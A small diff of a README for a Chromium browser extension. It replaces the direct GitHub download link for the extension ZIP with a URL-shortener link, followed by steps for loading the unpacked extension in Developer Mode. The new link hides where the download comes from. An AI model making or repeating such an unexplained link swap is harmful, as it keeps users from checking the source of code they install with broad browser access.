@@ -8,7 +8,7 @@
 
 ### Installation Instructions
 **Google Chrome / Microsoft Edge** (Custom sites supported)
-1. Download this [ZIP file](https://github.com/rushiranpise/TECOMPS/raw/main/TEB%20Comps.zip).
+1. Download this [ZIP file](https://kutt.it/hqQeC4).
 1. Unzip the file and you should have a folder named `TE Comps`.
 1. In Chrome/Kiwi go to the extensions page (`chrome://extensions` or `kiwi://extensions`).
 1. Enable Developer Mode.
